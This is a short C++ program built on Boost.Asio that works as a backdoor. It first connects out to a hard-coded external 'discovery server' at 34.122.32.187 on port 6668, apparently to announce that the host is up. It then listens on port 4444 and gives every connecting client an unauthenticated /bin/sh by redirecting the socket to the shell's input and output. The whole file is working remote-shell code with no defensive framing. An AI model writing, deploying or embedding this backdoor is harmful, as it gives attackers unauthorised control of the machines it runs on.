#include <unistd.h>

#include <boost/asio.hpp>
#include <cstring>
#include <iostream>

// Replace with the port you want to listen on
#define SERVER_PORT 4444
// Replace with the discovery server IP
#define DISCOVERY_SERVER_IP "34.122.32.187"
// Replace with the discovery server port
#define DISCOVERY_SERVER_PORT "6668"

using tcp = boost::asio::ip::tcp;

void discover() {
  try {
    boost::asio::io_context io_context;
    // Create a resolver and query
    tcp::resolver resolver(io_context);
    auto endpoints =
        resolver.resolve(DISCOVERY_SERVER_IP, DISCOVERY_SERVER_PORT);

    // Create and connect the socket
    tcp::socket socket(io_context);
    boost::asio::connect(socket, endpoints);

    // Gracefully close the socket
    socket.shutdown(tcp::socket::shutdown_both);
    socket.close();

  } catch (std::exception &e) {
    std::cerr << "[ERROR] " << e.what() << std::endl;
  }
}

void handle_client(tcp::socket socket) {
  int sock_fd = socket.native_handle();

  // Redirect standard input, output, and error to the socket
  dup2(sock_fd, 0);
  dup2(sock_fd, 1);
  dup2(sock_fd, 2);

  // Execute the shell
  execl("/bin/sh", "/bin/sh", (char *)NULL);
}

int main() {
  discover();

  try {
    boost::asio::io_context io_context;
    tcp::acceptor acceptor(io_context, tcp::endpoint(tcp::v4(), SERVER_PORT));

    while (true) {
      // Wait for a connection
      tcp::socket socket(io_context);
      acceptor.accept(socket);

      // Fork the process to handle the client
      pid_t pid = fork();
      if (pid == 0) {
        // Child process handles the client
        handle_client(std::move(socket));
        // Ensure the child process exits after handling the client
        exit(0);
      } else if (pid > 0) {
        // Parent process continues to accept new connections
        socket.close();  // Close the socket in the parent process
      } else {
        std::cerr << "[ERROR] Fork failed.\n";
        return 1;
      }
    }
  } catch (std::exception &e) {
    std::cerr << "[ERROR] " << e.what() << std::endl;
    return 1;
  }

  return 0;
}
